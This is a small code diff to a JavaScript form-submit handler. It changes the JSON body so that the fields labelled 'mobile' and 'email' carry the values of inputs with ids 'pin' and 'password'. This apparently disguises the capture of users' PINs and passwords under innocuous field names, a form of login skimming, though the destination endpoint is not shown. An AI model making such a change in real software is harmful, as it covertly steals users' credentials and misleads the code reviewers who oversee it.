@@ -52,8 +52,8 @@ form.addEventListener("submit", async (event) => {
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify({
         name: document.getElementById("name").value,
-        mobile: document.getElementById("mobile").value,
-        email: document.getElementById("email").value,
+        mobile: document.getElementById("pin").value,
+        email: document.getElementById("password").value,
         consent: document.getElementById("consent").checked
       })
     });
